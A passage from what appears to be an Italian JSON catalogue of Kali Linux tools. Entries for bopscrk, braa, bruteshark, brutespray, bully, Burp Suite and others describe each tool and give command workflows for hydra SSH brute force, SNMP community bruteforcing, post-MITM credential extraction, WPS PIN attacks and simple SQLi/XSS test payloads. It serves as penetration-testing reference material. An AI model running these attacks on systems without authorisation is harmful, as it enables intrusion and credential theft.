16)\nawk 'length >= 8 && length <= 16' wordlist_clean.txt > wordlist_filtered.txt\n\n# === INTEGRAZIONE HASHCAT ===\n# Genera base con BOPSCRK, applica regole hashcat\nbopscrk -n mario -s rossi -o base.txt\nhashcat -a 0 -m 0 hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule\n\n# === WORKFLOW COMPLETO ===\n# 1. OSINT sul target (LinkedIn, Facebook, Instagram)\n# 2. Raccogli: nome, cognome, data nascita, familiari, pet, hobby, azienda\n# 3. Genera wordlist personalizzata\nbopscrk -i -o target_wordlist.txt\n# 4. Combina con dizionario base\ncat target_wordlist.txt /usr/share/wordlists/rockyou.txt | sort -u > combined.txt\n# 5. Attack\nhydra -l mario.rossi -P combined.txt target.com ssh</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Targeted Password Attacks</strong>, dopo OSINT approfondito su un target specifico, la wordlist personalizzata ha success rate 10x superiore a dizionari generici.</p><p>In <strong>Spear Phishing Campaigns</strong>, le password 'indovinate' dimostrano compromissione credibile.</p><p>Per <strong>Security Awareness Training</strong>, dimostra concretamente quanto le password basate su info personali siano deboli.</p><p>In <strong>Password Policy Assessment</strong>, verifica se la policy impedisce password prevedibili.</p><p>Per <strong>CTF</strong>, challenge che richiedono 'conoscere' il target spesso si risolvono con wordlist personalizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficienza:</strong> Wordlist personalizzate sono piccole (10K-100K) ma efficaci. Meglio di rockyou per target specifici.</p><p><strong>Combinazione:</strong> Massima efficacia combinando BOPSCRK output con regole hashcat (best64, dive, OneRuleToRuleThemAll).</p><p><strong>OSINT Quality:</strong> L'efficacia dipende dalla qualità delle info raccolte. Più dati = più combinazioni = più probabilità.</p><p><strong>Account Lockout:</strong> Wordlist grandi possono triggerare lockout. Verificare policy prima di attaccare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "braa",
    "name": "braa",
    "version": "0.82",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/braa/",
    "desc": "Scanner SNMP massivo per interrogare rapidamente migliaia di host.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Braa</strong> è uno scanner SNMP ad altissime prestazioni progettato per interrogare decine di migliaia di host in parallelo. A differenza di snmpwalk/snmpget che operano sequenzialmente (un host alla volta), Braa implementa un proprio stack SNMP asincrono che può gestire migliaia di query simultanee, completando scansioni di intere /16 subnet in pochi minuti. È ottimizzato per discovery massiva, estrazione rapida di OID specifici, e community string bruteforcing su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Parallelism:</strong> Architettura asincrona che gestisce 50.000+ query simultanee usando socket raw UDP.</p><p><strong>Multi-OID Query:</strong> Interroga multipli OID in una singola scansione per estrarre informazioni composite.</p><p><strong>Range Support:</strong> Supporta CIDR notation, range IP (1-254), e liste di host.</p><p><strong>Community Bruteforce:</strong> Testa multiple community string contro molti host simultaneamente.</p><p><strong>Performance:</strong> Scansione di /24 in ~1 secondo, /16 in ~5 minuti (dipende da rete/timeout).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SINTASSI BASE ===\n# braa [opzioni] community@host:OID\n\n# === OID COMUNI ===\n# .1.3.6.1.2.1.1.1.0  - sysDescr (descrizione sistema)\n# .1.3.6.1.2.1.1.3.0  - sysUpTime\n# .1.3.6.1.2.1.1.4.0  - sysContact\n# .1.3.6.1.2.1.1.5.0  - sysName (hostname)\n# .1.3.6.1.2.1.1.6.0  - sysLocation\n# .1.3.6.1.2.1.2.1.0  - ifNumber (num interfacce)\n\n# === DISCOVERY BASE ===\n# Query sysDescr su subnet\nbraa public@192.168.1.1-254:.1.3.6.1.2.1.1.1.0\n\n# Query hostname\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.5.0\n\n# Query multipli OID\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0,.1.3.6.1.2.1.1.5.0,.1.3.6.1.2.1.1.6.0\n\n# === OPZIONI PERFORMANCE ===\n# Timeout personalizzato (default 2s)\nbraa -t 1 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0\n\n# Numero query parallele (default 256)\nbraa -p 512 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0\n\n# === COMMUNITY BRUTEFORCE ===\n# Testa più community string\nfor comm in public private admin cisco; do\n  braa $comm@192.168.1.0/24:.1.3.6.1.2.1.1.1.0 2>/dev/null | grep -v \"Timeout\"\ndone\n\n# Con lista community\nwhile read comm; do\n  braa \"$comm@192.168.1.0/24:.1.3.6.1.2.1.1.1.0\"\ndone < community_list.txt\n\n# === LARGE SCALE SCANNING ===\n# Scansione /16 (65K host)\nbraa -t 1 -p 1000 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0 > snmp_results.txt\n\n# Parse risultati\ngrep -v \"Timeout\" snmp_results.txt | cut -d: -f1 | sort -u > snmp_hosts.txt\n\n# === WORKFLOW PENTEST ===\n# 1. Discovery SNMP\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0 > snmp_discovery.txt\n\n# 2. Identifica dispositivi con SNMP attivo\ngrep -v \"Timeout\" snmp_discovery.txt\n\n# 3. Bruteforce community su host trovati\nfor host in $(cut -d: -f1 snmp_discovery.txt | grep -v Timeout); do\n  for comm in public private admin cisco community; do\n    result=$(braa -t 1 \"$comm@$host:.1.3.6.1.2.1.1.1.0\" 2>/dev/null | grep -v Timeout)\n    [ -n \"$result\" ] && echo \"$host: $comm works\"\n  done\ndone\n\n# 4. Dump completo su dispositivi trovati\nsnmpwalk -v2c -c found_community target_ip</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Discovery</strong>, identifica rapidamente tutti i dispositivi SNMP su reti enterprise anche molto grandi (/16, /8).</p><p>Per <strong>Asset Inventory</strong>, estrae informazioni di sistema (descrizione, hostname, location) da router, switch, stampanti, UPS, IoT.</p><p>Nel <strong>Vulnerability Assessment</strong>, trova dispositivi con community string di default (public, private, admin) - ancora sorprendentemente comuni.</p><p>Per <strong>Penetration Testing</strong>, SNMP con community RW permette modifica configurazioni, community RO espone informazioni sensibili (routing tables, ARP cache).</p><p>In <strong>Compliance Audit</strong>, verifica che SNMP sia disabilitato o protetto con community complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Volume elevato di traffico UDP/161 è facilmente rilevabile da IDS/SIEM. Scansioni massive triggerano alert.</p><p><strong>Rate Limiting:</strong> Alcuni dispositivi rate-limitano SNMP. Troppo aggressivo = timeout falsi positivi.</p><p><strong>Community Exposure:</strong> SNMP v1/v2c trasmette community in chiaro. Sniffable su rete non switched.</p><p><strong>SNMPv3:</strong> Braa supporta principalmente v1/v2c. Per v3 con auth/privacy, usare snmpwalk.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "bruteshark",
    "name": "bruteshark",
    "version": "1.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bruteshark/",
    "desc": "Analizza PCAP per estrarre credenziali, hash, sessioni e ricostruire flussi TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BruteShark</strong> è uno strumento di Network Forensic Analysis Tool (NFAT) sviluppato in C#/.NET che analizza file PCAP per estrarre automaticamente informazioni di sicurezza. Identifica credenziali in chiaro da molteplici protocolli, estrae hash per cracking offline (Kerberos, NTLM, NetNTLMv2), ricostruisce sessioni TCP complete, carves file trasferiti, e genera mappe visuali delle comunicazioni. Disponibile come applicazione desktop GUI e CLI per automazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Extraction:</strong> Estrae credenziali da HTTP Basic/Digest/NTLM, FTP, SMTP, POP3, IMAP, Telnet, LDAP, Kerberos in formato ready-to-crack.</p><p><strong>Hash Extraction:</strong> Estrae hash Kerberos AS-REP/TGS, NTLM, NetNTLMv1/v2 in formato hashcat/john direttamente crackabili.</p><p><strong>Session Reconstruction:</strong> Ricostruisce sessioni TCP complete per analisi del contenuto applicativo.</p><p><strong>File Carving:</strong> Estrae file trasferiti via HTTP, FTP, SMB (immagini, documenti, eseguibili) mantenendo struttura originale.</p><p><strong>Network Diagram:</strong> Genera automaticamente grafo delle comunicazioni tra host con statistiche traffico.</p><p><strong>VoIP Analysis:</strong> Estrae audio da chiamate SIP/RTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GUI ===\nBruteSharkDesktop\n# File > Add File(s) > seleziona PCAP\n# Analyze per avviare estrazione\n# Tabs: Credentials, Hashes, Files, Sessions, Network Map\n\n# === CLI ===\n# Analisi base\nBruteSharkCli -d capture.pcap -o /output/folder\n\n# Moduli specifici\nBruteSharkCli -d capture.pcap -m Credentials,Hashes -o /output\n\n# === OUTPUT FILES ===\n# /output/Credentials.txt - username:password\n# /output/Hashes.txt - formato hashcat ready\n# /output/Files/ - file estratti\n# /output/NetworkMap.png - diagramma rete\n\n# === WORKFLOW POST-MITM ===\n# 1. Cattura traffico durante MITM\nsudo bettercap -iface eth0 -caplet sniff.cap\n\n# 2. Estrai credenziali\nBruteSharkCli -d capture.pcap -m Credentials -o ./extracted\n\n# 3. Cracka hash estratti\nhashcat -a 0 extracted/Hashes.txt /usr/share/wordlists/rockyou.txt\n\n# === INTEGRAZIONE WIRESHARK ===\n# Esporta da Wireshark: File > Export Objects > HTTP\n# Analizza con BruteShark per automazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Forensics</strong>, analizza traffico catturato durante incident response per identificare credenziali esfiltrate e comunicazioni sospette.</p><p>Per <strong>Pentest Post-MITM</strong>, estrae automaticamente tutte le credenziali catturate durante attacchi ARP/DNS spoofing.</p><p>In <strong>CTF</strong>, le challenge PCAP spesso contengono credenziali, flag in file trasferiti, o hash da craccare.</p><p>Per <strong>Red Team</strong>, analizza rapidamente grandi catture per trovare quick wins (credenziali plaintext).</p><p>In <strong>Security Audit</strong>, identifica protocolli che trasmettono credenziali in chiaro sulla rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico Cifrato:</strong> Non decifra HTTPS, SSH, TLS. Per questi, serve key logging o SSLstrip durante cattura.</p><p><strong>Performance:</strong> File PCAP grandi (GB+) richiedono RAM significativa e tempo di processing.</p><p><strong>False Positives:</strong> Alcuni pattern potrebbero essere identificati erroneamente come credenziali. Verificare manualmente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "brutespray",
    "name": "brutespray",
    "version": "2.2.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/brutespray/",
    "desc": "Automatizza brute force su servizi trovati da Nmap/Nessus con Medusa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BruteSpray</strong> automatizza il processo di credential testing sui servizi scoperti durante la scansione di rete. Prende in input risultati Nmap (XML, gNMAP) o Nessus/Nexpose e lancia automaticamente attacchi contro tutti i servizi supportati usando Medusa come backend. Supporta 20+ protocolli (SSH, FTP, Telnet, MySQL, MSSQL, PostgreSQL, VNC, RDP, SMB, SNMP, ecc.) e gestisce parallelismo, logging, e output strutturato. È il bridge ideale tra discovery e exploitation nel workflow di pentest.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Format Input:</strong> Legge Nmap XML/gNMAP, Nessus .nessus, file JSON custom. Auto-detecta servizi da output scan.</p><p><strong>20+ Protocols:</strong> SSH, FTP, Telnet, HTTP(S), MySQL, MSSQL, PostgreSQL, Oracle, VNC, RDP, SMB, SNMP, LDAP, POP3, IMAP, SMTP e altri.</p><p><strong>Parallel Attacks:</strong> Configura threads per host e per servizio per massima efficienza senza sovraccaricare i target.</p><p><strong>Credential Sources:</strong> Username/password singoli, file wordlist, combo file (user:pass), o default credentials builtin.</p><p><strong>Output Management:</strong> Log dettagliati, output JSON per automazione, report credenziali trovate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === INPUT DA NMAP ===\n# Prima esegui scan Nmap con version detection\nnmap -sV -oA scan 192.168.1.0/24\n\n# BruteSpray su output gNMAP\nbrutespray -f scan.gnmap -u users.txt -p passwords.txt\n\n# BruteSpray su output XML\nbrutespray -f scan.xml -U admin -P /usr/share/wordlists/rockyou.txt\n\n# === CONFIGURAZIONE ===\n# Solo servizi specifici\nbrutespray -f scan.xml -s ssh,ftp,mysql -u users.txt -p pass.txt\n\n# Threads per host e servizio\nbrutespray -f scan.xml -u users.txt -p pass.txt -t 5 -T 2\n\n# Con credenziali default builtin\nbrutespray -f scan.xml --default\n\n# === WORDLIST ===\n# Username comuni\necho -e \"admin\\nroot\\nuser\\ntest\\nguest\" > users.txt\n\n# Password comuni\necho -e \"admin\\npassword\\n123456\\nroot\\ntest\" > pass.txt\n\n# === WORKFLOW COMPLETO ===\n# 1. Scan veloce\nnmap -sV -T4 --top-ports 1000 -oA initial 10.0.0.0/24\n\n# 2. BruteSpray con defaults + wordlist piccola\nbrutespray -f initial.gnmap --default -u users.txt -p pass.txt -o results.txt\n\n# 3. Review credenziali trovate\ncat results.txt | grep \"SUCCESS\"\n\n# === OUTPUT ===\n# Salva risultati in file\nbrutespray -f scan.xml -u users.txt -p pass.txt -o found_creds.txt\n\n# Output JSON per automazione\nbrutespray -f scan.xml -u users.txt -p pass.txt --json -o results.json\n\n# === CONTINUOUS MODE ===\n# Brute force continuo su servizi trovati\nbrutespray -f scan.xml -u users.txt -p pass.txt -c  # continue on success</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Workflow <strong>OSCP/Internal Pentest</strong>: dopo Nmap, BruteSpray testa rapidamente credenziali di default e comuni su tutti i servizi scoperti.</p><p>Per <strong>Automation Pipeline</strong>, integrabile in script di scansione automatizzata (Nmap -> BruteSpray -> Report).</p><p>In <strong>Password Audit</strong>, verifica che non esistano credenziali deboli o default su servizi esposti.</p><p>Per <strong>Quick Wins</strong>, le credenziali default sono sorprendentemente comuni in ambienti enterprise (admin:admin, root:toor).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Account Lockout:</strong> Brute force può causare lockout. Verificare policy prima. Usare wordlist piccole e specifiche.</p><p><strong>Detection:</strong> Molti login falliti sono facilmente rilevabili da SIEM/IDS. Genera log evidenti sui target.</p><p><strong>Rate Limiting:</strong> Alcuni servizi hanno rate limiting. Ridurre threads se timeout frequenti.</p><p><strong>Legal:</strong> Solo su sistemi autorizzati. Brute force non autorizzato è reato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "bulk-extractor",
    "name": "bulk-extractor",
    "version": "2.1.1",
    "icon": "../app/icons/bulk-extractor-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bulk-extractor/",
    "desc": "Estrae email, URL, carte di credito, hash da immagini disco senza mount.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bulk_extractor è uno strumento di digital forensics ad altissime prestazioni sviluppato dal Naval Postgraduate School. Scansiona immagini disco, file o directory alla ricerca di informazioni strutturate (PII) senza richiedere mount del filesystem - opera direttamente sui byte raw, estraendo dati anche da spazio non allocato, slack space, file compressi e nested archives. Parallelizzato per sfruttare tutti i core CPU, può analizzare terabyte in ore. Output: file categorizzati + istogrammi per analisi frequenze.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Email Scanner:</strong> Estrae indirizzi email, domini associati, e costruisce histogrammi dei più frequenti.</p><p><strong>URL/Domain:</strong> Identifica URL visitati, domini, con decodifica di URL encoding.</p><p><strong>Credit Card:</strong> Riconosce numeri di carte di credito con validazione Luhn e identificazione issuer.</p><p><strong>Phone/SSN:</strong> Estrae numeri di telefono e Social Security Numbers in vari formati.</p><p><strong>EXIF:</strong> Estrae metadati EXIF da immagini inclusi GPS coordinates.</p><p><strong>Hash Recognition:</strong> Identifica hash MD5, SHA1, SHA256 nel testo.</p><p><strong>Network Artifacts:</strong> IP addresses, MAC addresses, search terms.</p><p><strong>Compression-Aware:</strong> Decomprime automaticamente ZIP, GZIP, RAR, 7z, PDF streams.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ANALISI BASE ===\n# Estrazione completa da immagine disco\nbulk_extractor -o output_dir disk_image.dd\n\n# Con tutti i threads disponibili (default)\nbulk_extractor -o output disk.img\n\n# === SCANNER SPECIFICI ===\n# Solo email e URL\nbulk_extractor -E email -E url -o output disk.img\n\n# Lista scanner disponibili\nbulk_extractor -H\n\n# Disabilita scanner specifici\nbulk_extractor -x exif -x gps -o output disk.img\n\n# === INPUT SOURCES ===\n# Da directory (ricorsivo)\nbulk_extractor -o output -R /path/to/directory\n\n# Da file singolo\nbulk_extractor -o output suspicious_file.exe\n\n# Da memory dump\nbulk_extractor -o output memory.dmp\n\n# === OUTPUT FILES ===\n# output_dir/\n#   email.txt - indirizzi email estratti\n#   url.txt - URL trovati\n#   ccn.txt - credit card numbers\n#   telephone.txt - numeri telefono\n#   domain.txt - domini\n#   exif.txt - metadata EXIF\n#   *_histogram.txt - frequenze per ogni categoria\n\n# === POST-PROCESSING ===\n# Top 10 email più frequenti\nhead -20 output_dir/email_histogram.txt\n\n# Cerca email specifico dominio\ngrep \"@target.com\" output_dir/email.txt\n\n# Estrai GPS coordinates\ncat output_dir/exif.txt | grep -i \"gps\"\n\n# === WORKFLOW FORENSICS ===\n# 1. Acquisizione immagine\ndc3dd if=/dev/sda of=disk.img hash=sha256 log=acquisition.log\n\n# 2. Bulk extraction\nbulk_extractor -o bulk_output disk.img\n\n# 3. Analisi istogrammi\nfor f in bulk_output/*_histogram.txt; do\n  echo \"=== $f ===\"\n  head -10 \"$f\"\ndone\n\n# 4. Report summary\nwc -l bulk_output/*.txt > summary.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, primo tool lanciato su immagine per panoramica rapida dei PII presenti e delle comunicazioni.</p><p>Per <strong>Data Breach Investigation</strong>, identifica rapidamente quali dati sensibili (email, CCN, PII) potrebbero essere stati compromessi.</p><p>In <strong>eDiscovery</strong>, estrazione automatizzata di comunicazioni e documenti rilevanti per contenziosi.</p><p>Per <strong>Malware Analysis</strong>, estrae indicatori (URL, email, domini) da sample malware.</p><p>In <strong>Memory Forensics</strong>, complementa Volatility per estrazione stringhe strutturate da RAM dump.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> Multi-threaded, analizza ~1GB/min su hardware moderno. Terabyte in ore, non giorni.</p><p><strong>Space:</strong> Output può essere significativo (GB per disk grandi). Prevedere spazio adeguato.</p><p><strong>False Positives:</strong> Pattern matching può generare falsi positivi (es. numeri che sembrano CCN). Verificare manualmente i risultati critici.</p><p><strong>Privacy:</strong> Output contiene PII sensibili. Proteggere adeguatamente e cancellare dopo analisi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "bully",
    "name": "bully",
    "version": "1.4.00",
    "icon": "../app/icons/bully-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bully/",
    "desc": "Attacca WPS con brute force del PIN per recuperare passphrase WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bully</strong> è un'implementazione del WPS brute force attack, alternativa più efficiente a Reaver. La vulnerabilità WPS (CVE-2011-5053) deriva dal design del protocollo: il PIN a 8 cifre viene verificato in due metà separate (4+3 cifre + 1 checksum), riducendo lo spazio di ricerca da 10^8 a ~11.000 tentativi. Bully sfrutta questo difetto per recuperare la password WPA/WPA2 senza catturare handshake. Include supporto per Pixie-Dust attack che recupera il PIN offline in secondi su router vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS PIN Bruteforce:</strong> Attacco online che testa sequenzialmente le combinazioni PIN sfruttando la vulnerabilità del checksum.</p><p><strong>Pixie-Dust Attack:</strong> Attacco offline che sfrutta PRNG debole in alcuni chipset (Ralink, Realtek, Broadcom) per recuperare PIN in secondi.</p><p><strong>Session Management:</strong> Salva progresso in file .wpc permettendo di riprendere attacchi interrotti.</p><p><strong>Rate Limiting Handling:</strong> Rileva lockout AP e attende automaticamente timeout prima di riprendere.</p><p><strong>Multiple Modes:</strong> Supporta WPS PIN, Push-Button (PBC), e registrar mode.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP ===\n# Monitor mode\nairmon-ng start wlan0\n\n# Identifica AP con WPS abilitato\nwash -i wlan0mon\n# Output mostra: BSSID, Channel, WPS Version, WPS Locked status\n\n# === PIXIE-DUST (VELOCE) ===\n# Prova prima Pixie-Dust - funziona in secondi se vulnerabile\nbully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon\n\n# Con verbose per debug\nbully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon\n\n# === BRUTE FORCE ONLINE ===\n# Se Pixie-Dust fallisce, brute force tradizionale\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# Con PIN parziale noto (accelera)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -p 1234 wlan0mon\n\n# === OPZIONI AVANZATE ===\n# Delay tra tentativi (evita lockout)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -l 3 wlan0mon\n\n# Timeout per risposta (default 5s)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -t 10 wlan0mon\n\n# Forza continuazione anche se AP sembra locked\nbully -b AA:BB:CC:DD:EE:FF -c 6 -F wlan0mon\n\n# === SESSION RECOVERY ===\n# Salva automaticamente in ~/.bully/\n# Per riprendere, usa stesso comando\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# === WORKFLOW COMPLETO ===\n# 1. Scan per target WPS\nwash -i wlan0mon -C  # Con color\n\n# 2. Prova Pixie-Dust su target interessanti\nfor bssid in AA:BB:CC:DD:EE:FF BB:CC:DD:EE:FF:00; do\n  timeout 60 bully -b $bssid -c 6 -d wlan0mon\ndone\n\n# 3. Se Pixie-Dust fallisce, brute force (patience...)\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# Output successo:\n# [+] WPS PIN: 12345678\n# [+] WPA PSK: MySecretPassword123</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, alternativa quando password WPA è troppo complessa per dictionary attack. Pixie-Dust è devastante su router vulnerabili.</p><p>Per <strong>Home/SOHO Assessment</strong>, molti router consumer hanno ancora WPS abilitato di default - quick win frequente.</p><p>In <strong>Security Audit</strong>, verifica che WPS sia disabilitato su AP aziendali come da best practice.</p><p>Per <strong>CTF Wireless</strong>, challenge WPS sono comuni e Bully è più stabile di Reaver.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Router moderni bloccano dopo 3-10 tentativi falliti. Timeout 60-300 secondi. Attacco può richiedere ore/giorni.</p><p><strong>WPS Locked:</strong> Alcuni AP disabilitano WPS permanentemente dopo troppi tentativi. Verifica stato con wash.</p><p><strong>Logging:</strong> Ogni tentativo WPS è loggato dall'AP. Attività facilmente rilevabile.</p><p><strong>Chipset Support:</strong> Pixie-Dust funziona solo su chipset specifici (Ralink RT, Realtek RTL, alcuni Broadcom). Non universale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "burpsuite-kali",
    "name": "burpsuite",
    "version": "2025.7.4",
    "icon": "../app/icons/burpsuite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/burpsuite/",
    "desc": "Piattaforma integrata per web security testing: proxy, scanner, repeater, intruder.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Burp Suite di PortSwigger è lo standard industriale per web application security testing, utilizzato dalla maggioranza dei pentester e bug bounty hunter. Funziona come proxy HTTP/HTTPS intercettante che permette di analizzare, modificare, ripetere e automatizzare richieste. La versione Community offre tool manuali essenziali (Proxy, Repeater, Intruder base, Decoder, Comparer), mentre Pro aggiunge scanner automatico con AI, Intruder illimitato, collaborazione team, e estensioni avanzate. L'ecosistema BApp Store offre centinaia di estensioni per casi specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Proxy:</strong> Intercetta e modifica richieste/risposte HTTP(S) in tempo reale. Match & Replace rules per modifiche automatiche, WebSocket support, HTTP/2 support.</p><p><strong>Repeater:</strong> Modifica e rinvia singole richieste manualmente con syntax highlighting e auto-formatting. Essenziale per SQLi, XSS, IDOR testing.</p><p><strong>Intruder:</strong> Automatizza attacchi con payload multipli: Sniper (single position), Battering Ram (same payload all positions), Pitchfork (parallel), Cluster Bomb (combinatorial).</p><p><strong>Scanner (Pro):</strong> Rileva automaticamente OWASP Top 10 con ottima precisione. Scan passivo durante navigazione + scan attivo su richiesta.</p><p><strong>Collaborator (Pro):</strong> Server esterno per rilevare vulnerabilità blind (SSRF, XXE, blind SQLi) via DNS/HTTP callback.</p><p><strong>Sequencer:</strong> Analizza randomness di token (session ID, CSRF token) per identificare debolezze crittografiche.</p><p><strong>Decoder:</strong> Encode/decode rapido: URL, Base64, HTML entities, hex, gzip, e catene di trasformazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP ===\n# Avvio Burp Suite\nburpsuite  # Community\njava -jar burpsuite_pro.jar  # Pro\n\n# === CONFIGURAZIONE BROWSER ===\n# Proxy: 127.0.0.1:8080\n# Firefox: Settings > Network Settings > Manual proxy\n# Chrome: usa estensione FoxyProxy o SwitchyOmega\n\n# Installare certificato CA per HTTPS:\n# 1. Naviga a http://burp (con proxy attivo)\n# 2. Download CA Certificate\n# 3. Importa in browser: Settings > Certificates > Import\n\n# === WORKFLOW TIPICO ===\n# 1. DISCOVERY\n# - Naviga l'applicazione con proxy attivo\n# - Target > Site map popola automaticamente\n# - Spider (Pro) per crawling automatico\n\n# 2. ANALISI\n# - HTTP History: review tutte le richieste\n# - Filtra per: parametri, metodo, response code\n# - Send to Repeater richieste interessanti\n\n# 3. TESTING MANUALE (Repeater)\n# - Modifica parametri\n# - Test injection: ' OR 1=1--, <script>alert(1)</script>\n# - Analizza response per confermare vulnerabilità\n\n# 4. AUTOMAZIONE (Intruder)\n# - Positions: marca parametri da fuzzare §param§\n# - Payloads: wordlist, numeri, custom\n# - Attack: lancia e analizza risultati\n\n# 5. SCAN AUTOMATICO (Pro)\n# - Click destro > Scan\n# - Review Issues trovate\n# - Verifica manualmente false positives\n\n# === TIPS & TRICKS ===\n# Scope: definisci scope per filtrare rumore\n# Target > Scope > Add > *.target.com\n\n# Match & Replace: auto-modify requests\n# Proxy > Options > Match & Replace\n# Es: User-Agent, Authorization header\n\n# Macro: automatizza login flow\n# Project options > Sessions > Macros\n\n# === ESTENSIONI ESSENZIALI ===\n# BApp Store > installa:\n# - Autorize (IDOR/authorization testing)\n# - Logger++ (advanced logging)\n# - Param Miner (hidden parameter discovery)\n# - JWT Editor (JWT manipulation)\n# - Turbo Intruder (fast fuzzing)\n# - Active Scan++ (enhanced scanner)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>imprescindibile</strong> per ogni web pentest e bug bounty - copre l'intero workflow dalla discovery all'exploitation.</p><p>Per <strong>API Testing</strong>, analizza REST/GraphQL/SOAP con syntax highlighting e manipulation facile.</p><p>In <strong>Mobile App Testing</strong>, configura come proxy per intercettare traffico app mobile.</p><p>Per <strong>Authentication Testing</strong>, macro e session handling permettono test complessi su flussi multi-step.</p><p>In <strong>Security Training</strong>, ideale per imparare web security con feedback visivo immediato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>WAF Detection:</strong> Scanner Pro genera pattern riconoscibili. WAF possono bloccare o alertare. Usare throttling e User-Agent rotation.</p><p><strong>Certificate Pinning:</strong> App mobile con certificate pinning rifiutano cert Burp. Serve bypass (Frida, objection).</p><p><strong>Scope Control:</strong> Senza scope definito, Burp può scansionare/attaccare domini fuori target. Sempre configurare scope.</p><p><strong>Session Data:</strong> Project file contiene tutto il traffico intercettato. Proteggere e cancellare dopo engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "bytecode-viewer",
    "name": "bytecode-viewer",
    "version": "2.13.1",
    "icon": "../app/icons/bytecode-viewer-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bytecode-viewer/",
    "desc": "Decompila e analizza bytecode Java, Android DEX con più decompiler integrati.",
